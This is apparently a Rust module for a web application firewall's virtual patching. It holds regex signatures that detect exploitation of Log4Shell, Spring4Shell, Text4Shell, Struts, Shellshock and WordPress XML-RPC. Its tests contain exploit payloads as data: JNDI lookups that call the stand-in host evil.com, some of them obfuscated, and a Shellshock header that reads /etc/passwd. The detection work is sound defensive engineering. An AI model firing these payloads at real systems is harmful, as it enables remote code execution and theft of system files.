//! Virtual Patching Module
//!
//! Provides instant protection for known vulnerabilities (CVEs) without
//! requiring application updates. Virtual patches detect and block
//! exploitation attempts based on vulnerability signatures.
//!
//! # Rule ID Ranges
//!
//! - 93000-93499: Generic CVE patches
//! - 93500-93699: Web framework CVEs (WordPress, Drupal, etc.)
//! - 93700-93899: Library CVEs (Log4j, Spring, etc.)
//! - 93900-93999: Custom/user-defined patches

use std::collections::HashMap;
use std::time::{Duration, Instant};

use regex::Regex;
use serde::{Deserialize, Serialize};
use tracing::{debug, info, warn};

use crate::detection::Detection;
use crate::rules::AttackType;

/// Virtual patching configuration
#[derive(Debug, Clone)]
pub struct VirtualPatchConfig {
    /// Enable virtual patching
    pub enabled: bool,
    /// Auto-update patches from feed
    pub auto_update: bool,
    /// Update interval in seconds
    pub update_interval_secs: u64,
    /// Enable logging of patch matches
    pub log_matches: bool,
}

impl Default for VirtualPatchConfig {
    fn default() -> Self {
        Self {
            enabled: true,
            auto_update: true,
            update_interval_secs: 3600, // 1 hour
            log_matches: true,
        }
    }
}

/// A virtual patch for a specific vulnerability
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct VirtualPatch {
    /// Unique patch ID
    pub id: String,
    /// CVE identifier (e.g., "CVE-2021-44228")
    pub cve: String,
    /// Human-readable name
    pub name: String,
    /// Description of the vulnerability
    pub description: String,
    /// Affected software/versions
    pub affected: AffectedSoftware,
    /// Detection patterns
    #[serde(skip)]
    pub patterns: Vec<Regex>,
    /// Pattern strings for serialization
    pub pattern_strings: Vec<String>,
    /// Action to take on match
    pub action: PatchAction,
    /// CVSS score (0.0 - 10.0)
    pub cvss_score: f32,
    /// Severity level
    pub severity: Severity,
    /// Expiration date (Unix timestamp, None = never expires)
    pub expires: Option<u64>,
    /// Whether this patch is active
    pub active: bool,
    /// References (URLs)
    pub references: Vec<String>,
}

impl VirtualPatch {
    /// Create a new virtual patch
    pub fn new(
        id: impl Into<String>,
        cve: impl Into<String>,
        name: impl Into<String>,
    ) -> VirtualPatchBuilder {
        VirtualPatchBuilder {
            id: id.into(),
            cve: cve.into(),
            name: name.into(),
            description: String::new(),
            affected: AffectedSoftware::default(),
            patterns: Vec::new(),
            action: PatchAction::Block,
            cvss_score: 0.0,
            severity: Severity::Medium,
            expires: None,
            references: Vec::new(),
        }
    }

    /// Check if this patch matches the given input
    pub fn matches(&self, input: &str) -> bool {
        if !self.active {
            return false;
        }

        // Check expiration
        if let Some(expires) = self.expires {
            let now = std::time::SystemTime::now()
                .duration_since(std::time::UNIX_EPOCH)
                .map(|d| d.as_secs())
                .unwrap_or(0);
            if now > expires {
                return false;
            }
        }

        self.patterns.iter().any(|p| p.is_match(input))
    }

    /// Compile pattern strings into regex
    pub fn compile_patterns(&mut self) {
        self.patterns = self
            .pattern_strings
            .iter()
            .filter_map(|s| Regex::new(s).ok())
            .collect();
    }
}

/// Builder for VirtualPatch
pub struct VirtualPatchBuilder {
    id: String,
    cve: String,
    name: String,
    description: String,
    affected: AffectedSoftware,
    patterns: Vec<String>,
    action: PatchAction,
    cvss_score: f32,
    severity: Severity,
    expires: Option<u64>,
    references: Vec<String>,
}

impl VirtualPatchBuilder {
    /// Set description
    pub fn description(mut self, desc: impl Into<String>) -> Self {
        self.description = desc.into();
        self
    }

    /// Set affected software
    pub fn affected(mut self, affected: AffectedSoftware) -> Self {
        self.affected = affected;
        self
    }

    /// Add a detection pattern
    pub fn pattern(mut self, pattern: impl Into<String>) -> Self {
        self.patterns.push(pattern.into());
        self
    }

    /// Set action
    pub fn action(mut self, action: PatchAction) -> Self {
        self.action = action;
        self
    }

    /// Set CVSS score
    pub fn cvss(mut self, score: f32) -> Self {
        self.cvss_score = score;
        self
    }

    /// Set severity
    pub fn severity(mut self, severity: Severity) -> Self {
        self.severity = severity;
        self
    }

    /// Set expiration (Unix timestamp)
    pub fn expires(mut self, timestamp: u64) -> Self {
        self.expires = Some(timestamp);
        self
    }

    /// Add reference URL
    pub fn reference(mut self, url: impl Into<String>) -> Self {
        self.references.push(url.into());
        self
    }

    /// Build the virtual patch
    pub fn build(self) -> VirtualPatch {
        let compiled_patterns: Vec<Regex> = self
            .patterns
            .iter()
            .filter_map(|s| Regex::new(s).ok())
            .collect();

        VirtualPatch {
            id: self.id,
            cve: self.cve,
            name: self.name,
            description: self.description,
            affected: self.affected,
            patterns: compiled_patterns,
            pattern_strings: self.patterns,
            action: self.action,
            cvss_score: self.cvss_score,
            severity: self.severity,
            expires: self.expires,
            active: true,
            references: self.references,
        }
    }
}

/// Affected software specification
#[derive(Debug, Clone, Default, Serialize, Deserialize)]
pub struct AffectedSoftware {
    /// Vendor name
    pub vendor: Option<String>,
    /// Product name
    pub product: Option<String>,
    /// Affected version ranges
    pub versions: Vec<VersionRange>,
    /// CPE identifier
    pub cpe: Option<String>,
}

impl AffectedSoftware {
    pub fn new() -> Self {
        Self::default()
    }

    pub fn vendor(mut self, vendor: impl Into<String>) -> Self {
        self.vendor = Some(vendor.into());
        self
    }

    pub fn product(mut self, product: impl Into<String>) -> Self {
        self.product = Some(product.into());
        self
    }

    pub fn version_range(mut self, from: impl Into<String>, to: impl Into<String>) -> Self {
        self.versions.push(VersionRange {
            from: from.into(),
            to: to.into(),
        });
        self
    }
}

/// Version range
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct VersionRange {
    pub from: String,
    pub to: String,
}

/// Action to take when patch matches
#[derive(Debug, Clone, Copy, PartialEq, Eq, Serialize, Deserialize)]
#[serde(rename_all = "snake_case")]
pub enum PatchAction {
    /// Block the request
    Block,
    /// Log only (monitoring mode)
    Log,
    /// Add to anomaly score
    Score,
}

/// Severity level
#[derive(Debug, Clone, Copy, PartialEq, Eq, Serialize, Deserialize)]
#[serde(rename_all = "snake_case")]
pub enum Severity {
    Critical,
    High,
    Medium,
    Low,
    Info,
}

impl Severity {
    /// Get base score for this severity
    pub fn base_score(&self) -> u8 {
        match self {
            Severity::Critical => 10,
            Severity::High => 8,
            Severity::Medium => 5,
            Severity::Low => 3,
            Severity::Info => 1,
        }
    }
}

/// Virtual patch manager
pub struct VirtualPatchManager {
    config: VirtualPatchConfig,
    /// Active patches indexed by ID
    patches: HashMap<String, VirtualPatch>,
    /// Patches indexed by CVE
    patches_by_cve: HashMap<String, Vec<String>>,
    /// Last update time
    last_update: Option<Instant>,
}

impl VirtualPatchManager {
    /// Create a new virtual patch manager
    pub fn new(config: VirtualPatchConfig) -> Self {
        let mut manager = Self {
            config,
            patches: HashMap::new(),
            patches_by_cve: HashMap::new(),
            last_update: None,
        };

        // Load built-in patches
        manager.load_builtin_patches();

        manager
    }

    /// Load built-in patches for well-known vulnerabilities
    fn load_builtin_patches(&mut self) {
        // Log4Shell (CVE-2021-44228)
        self.add_patch(
            VirtualPatch::new("VP-93700", "CVE-2021-44228", "Log4Shell RCE")
                .description("Apache Log4j2 JNDI injection vulnerability")
                .affected(
                    AffectedSoftware::new()
                        .vendor("Apache")
                        .product("Log4j")
                        .version_range("2.0", "2.17.0"),
                )
                .pattern(r"(?i)\$\{jndi:")
                .pattern(r"(?i)\$\{j\$\{[^\}]*\}ndi:")
                .pattern(r"(?i)\$\{\$\{[^\}]*\}j\$\{[^\}]*\}n\$\{[^\}]*\}d\$\{[^\}]*\}i:")
                .pattern(r"(?i)\$\{(\$\{[^\}]*\}|[jJ]|\$\{[^\}]*\})+ndi:")
                .pattern(r"(?i)\$\{\$\{[^\}]*j\}\$\{[^\}]*n\}\$\{[^\}]*d\}\$\{[^\}]*i\}:")
                .cvss(10.0)
                .severity(Severity::Critical)
                .reference("https://nvd.nist.gov/vuln/detail/CVE-2021-44228")
                .build(),
        );

        // Spring4Shell (CVE-2022-22965)
        self.add_patch(
            VirtualPatch::new("VP-93701", "CVE-2022-22965", "Spring4Shell RCE")
                .description("Spring Framework RCE via data binding")
                .affected(
                    AffectedSoftware::new()
                        .vendor("VMware")
                        .product("Spring Framework")
                        .version_range("5.3.0", "5.3.18"),
                )
                .pattern(r"(?i)class\.module\.classLoader")
                .pattern(r"(?i)class\[")
                .cvss(9.8)
                .severity(Severity::Critical)
                .reference("https://nvd.nist.gov/vuln/detail/CVE-2022-22965")
                .build(),
        );

        // Text4Shell (CVE-2022-42889)
        self.add_patch(
            VirtualPatch::new("VP-93702", "CVE-2022-42889", "Text4Shell RCE")
                .description("Apache Commons Text StringSubstitutor RCE")
                .affected(
                    AffectedSoftware::new()
                        .vendor("Apache")
                        .product("Commons Text")
                        .version_range("1.5", "1.10.0"),
                )
                .pattern(r"(?i)\$\{script:")
                .pattern(r"(?i)\$\{dns:")
                .pattern(r"(?i)\$\{url:")
                .cvss(9.8)
                .severity(Severity::Critical)
                .reference("https://nvd.nist.gov/vuln/detail/CVE-2022-42889")
                .build(),
        );

        // Apache Struts RCE (CVE-2017-5638)
        self.add_patch(
            VirtualPatch::new("VP-93703", "CVE-2017-5638", "Apache Struts RCE")
                .description("Apache Struts Content-Type OGNL injection")
                .affected(
                    AffectedSoftware::new()
                        .vendor("Apache")
                        .product("Struts")
                        .version_range("2.3.5", "2.3.32"),
                )
                .pattern(r"(?i)%\{[^}]*\}")
                .pattern(r"(?i)\$\{[^}]*getRuntime[^}]*\}")
                .cvss(10.0)
                .severity(Severity::Critical)
                .reference("https://nvd.nist.gov/vuln/detail/CVE-2017-5638")
                .build(),
        );

        // Shellshock (CVE-2014-6271)
        self.add_patch(
            VirtualPatch::new("VP-93704", "CVE-2014-6271", "Shellshock")
                .description("GNU Bash environment variable command injection")
                .affected(
                    AffectedSoftware::new()
                        .vendor("GNU")
                        .product("Bash")
                        .version_range("1.0", "4.3"),
                )
                .pattern(r"\(\s*\)\s*\{")
                .pattern(r"(?i)%28%29%20%7B")
                .cvss(9.8)
                .severity(Severity::Critical)
                .reference("https://nvd.nist.gov/vuln/detail/CVE-2014-6271")
                .build(),
        );

        // WordPress XML-RPC pingback (multiple CVEs)
        self.add_patch(
            VirtualPatch::new("VP-93500", "CVE-2013-0235", "WordPress XML-RPC Abuse")
                .description("WordPress XML-RPC pingback DDoS and enumeration")
                .affected(
                    AffectedSoftware::new()
                        .vendor("WordPress")
                        .product("WordPress"),
                )
                .pattern(r"(?i)<methodName>pingback\.ping</methodName>")
                .pattern(r"(?i)<methodName>system\.multicall</methodName>")
                .cvss(5.0)
                .severity(Severity::Medium)
                .reference("https://nvd.nist.gov/vuln/detail/CVE-2013-0235")
                .build(),
        );

        info!(
            "Loaded {} built-in virtual patches",
            self.patches.len()
        );
    }

    /// Add a virtual patch
    pub fn add_patch(&mut self, patch: VirtualPatch) {
        let id = patch.id.clone();
        let cve = patch.cve.clone();

        self.patches.insert(id.clone(), patch);

        self.patches_by_cve
            .entry(cve)
            .or_insert_with(Vec::new)
            .push(id);
    }

    /// Remove a patch by ID
    pub fn remove_patch(&mut self, id: &str) -> Option<VirtualPatch> {
        if let Some(patch) = self.patches.remove(id) {
            if let Some(ids) = self.patches_by_cve.get_mut(&patch.cve) {
                ids.retain(|i| i != id);
            }
            Some(patch)
        } else {
            None
        }
    }

    /// Enable a patch
    pub fn enable_patch(&mut self, id: &str) {
        if let Some(patch) = self.patches.get_mut(id) {
            patch.active = true;
            debug!(patch_id = id, "Enabled virtual patch");
        }
    }

    /// Disable a patch
    pub fn disable_patch(&mut self, id: &str) {
        if let Some(patch) = self.patches.get_mut(id) {
            patch.active = false;
            debug!(patch_id = id, "Disabled virtual patch");
        }
    }

    /// Check input against all active patches
    pub fn check(&self, input: &str, location: &str) -> Vec<Detection> {
        if !self.config.enabled {
            return Vec::new();
        }

        let mut detections = Vec::new();

        for patch in self.patches.values() {
            if patch.matches(input) {
                let rule_id = patch
                    .id
                    .strip_prefix("VP-")
                    .and_then(|s| s.parse::<u32>().ok())
                    .unwrap_or(93000);

                detections.push(Detection {
                    rule_id,
                    rule_name: format!("{}: {}", patch.cve, patch.name),
                    attack_type: AttackType::RemoteCodeExecution,
                    matched_value: format!("Virtual patch match: {}", patch.id),
                    location: location.to_string(),
                    base_score: patch.severity.base_score() as u32,
                    tags: vec![
                        "vpatching".to_string(),
                        patch.cve.clone(),
                        patch.severity.to_string(),
                    ],
                });

                if self.config.log_matches {
                    info!(
                        cve = patch.cve,
                        patch_id = patch.id,
                        location = location,
                        "Virtual patch triggered"
                    );
                }
            }
        }

        detections
    }

    /// Get patch by ID
    pub fn get_patch(&self, id: &str) -> Option<&VirtualPatch> {
        self.patches.get(id)
    }

    /// Get patches by CVE
    pub fn get_patches_by_cve(&self, cve: &str) -> Vec<&VirtualPatch> {
        self.patches_by_cve
            .get(cve)
            .map(|ids| ids.iter().filter_map(|id| self.patches.get(id)).collect())
            .unwrap_or_default()
    }

    /// Get all active patches
    pub fn active_patches(&self) -> Vec<&VirtualPatch> {
        self.patches.values().filter(|p| p.active).collect()
    }

    /// Get statistics
    pub fn stats(&self) -> VirtualPatchStats {
        let active = self.patches.values().filter(|p| p.active).count();
        let critical = self
            .patches
            .values()
            .filter(|p| p.active && p.severity == Severity::Critical)
            .count();
        let high = self
            .patches
            .values()
            .filter(|p| p.active && p.severity == Severity::High)
            .count();

        VirtualPatchStats {
            total_patches: self.patches.len(),
            active_patches: active,
            critical_patches: critical,
            high_patches: high,
        }
    }

    /// Check if update is needed
    pub fn needs_update(&self) -> bool {
        if !self.config.auto_update {
            return false;
        }

        match self.last_update {
            Some(last) => {
                last.elapsed() > Duration::from_secs(self.config.update_interval_secs)
            }
            None => true,
        }
    }

    /// Mark as updated
    pub fn mark_updated(&mut self) {
        self.last_update = Some(Instant::now());
    }
}

impl Default for VirtualPatchManager {
    fn default() -> Self {
        Self::new(VirtualPatchConfig::default())
    }
}

impl std::fmt::Display for Severity {
    fn fmt(&self, f: &mut std::fmt::Formatter<'_>) -> std::fmt::Result {
        match self {
            Severity::Critical => write!(f, "critical"),
            Severity::High => write!(f, "high"),
            Severity::Medium => write!(f, "medium"),
            Severity::Low => write!(f, "low"),
            Severity::Info => write!(f, "info"),
        }
    }
}

/// Statistics about virtual patches
#[derive(Debug, Clone)]
pub struct VirtualPatchStats {
    pub total_patches: usize,
    pub active_patches: usize,
    pub critical_patches: usize,
    pub high_patches: usize,
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_log4shell_detection() {
        let manager = VirtualPatchManager::default();

        let payloads = vec![
            "${jndi:ldap://evil.com/a}",
            "${jndi:rmi://evil.com/a}",
            "${${lower:j}ndi:ldap://evil.com/a}",
            "${${::-j}${::-n}${::-d}${::-i}:ldap://evil.com/a}",
        ];

        for payload in payloads {
            let detections = manager.check(payload, "body");
            assert!(
                !detections.is_empty(),
                "Should detect Log4Shell in: {}",
                payload
            );
            assert!(detections.iter().any(|d| d.rule_name.contains("CVE-2021-44228")));
        }
    }

    #[test]
    fn test_spring4shell_detection() {
        let manager = VirtualPatchManager::default();

        let payload = "class.module.classLoader.resources.context.parent";
        let detections = manager.check(payload, "body");

        assert!(!detections.is_empty());
        assert!(detections.iter().any(|d| d.rule_name.contains("CVE-2022-22965")));
    }

    #[test]
    fn test_shellshock_detection() {
        let manager = VirtualPatchManager::default();

        let payload = "() { :; }; /bin/cat /etc/passwd";
        let detections = manager.check(payload, "header");

        assert!(!detections.is_empty());
        assert!(detections.iter().any(|d| d.rule_name.contains("CVE-2014-6271")));
    }

    #[test]
    fn test_clean_input() {
        let manager = VirtualPatchManager::default();

        let clean_inputs = vec![
            "Hello, World!",
            "SELECT * FROM users WHERE id = 1",
            "<script>alert('xss')</script>",
        ];

        for input in clean_inputs {
            let detections = manager.check(input, "body");
            // These might trigger other rules, but not vpatching
            assert!(
                !detections.iter().any(|d| d.tags.contains(&"vpatching".to_string())),
                "Should not trigger vpatching for: {}",
                input
            );
        }
    }

    #[test]
    fn test_add_custom_patch() {
        let mut manager = VirtualPatchManager::default();
        let initial_count = manager.patches.len();

        manager.add_patch(
            VirtualPatch::new("VP-99000", "CVE-2099-1234", "Custom Vuln")
                .description("Test vulnerability")
                .pattern(r"CUSTOM_EXPLOIT")
                .severity(Severity::High)
                .build(),
        );

        assert_eq!(manager.patches.len(), initial_count + 1);

        let detections = manager.check("CUSTOM_EXPLOIT payload", "body");
        assert!(!detections.is_empty());
    }

    #[test]
    fn test_disable_patch() {
        let mut manager = VirtualPatchManager::default();

        // Should detect Log4Shell
        let detections = manager.check("${jndi:ldap://evil.com}", "body");
        assert!(!detections.is_empty());

        // Disable the patch
        manager.disable_patch("VP-93700");

        // Should no longer detect
        let detections = manager.check("${jndi:ldap://evil.com}", "body");
        assert!(detections.is_empty());

        // Re-enable
        manager.enable_patch("VP-93700");

        // Should detect again
        let detections = manager.check("${jndi:ldap://evil.com}", "body");
        assert!(!detections.is_empty());
    }

    #[test]
    fn test_stats() {
        let manager = VirtualPatchManager::default();
        let stats = manager.stats();

        assert!(stats.total_patches > 0);
        assert!(stats.active_patches > 0);
        assert!(stats.critical_patches > 0);
    }

    #[test]
    fn test_severity_score() {
        assert_eq!(Severity::Critical.base_score(), 10);
        assert_eq!(Severity::High.base_score(), 8);
        assert_eq!(Severity::Medium.base_score(), 5);
        assert_eq!(Severity::Low.base_score(), 3);
        assert_eq!(Severity::Info.base_score(), 1);
    }
}
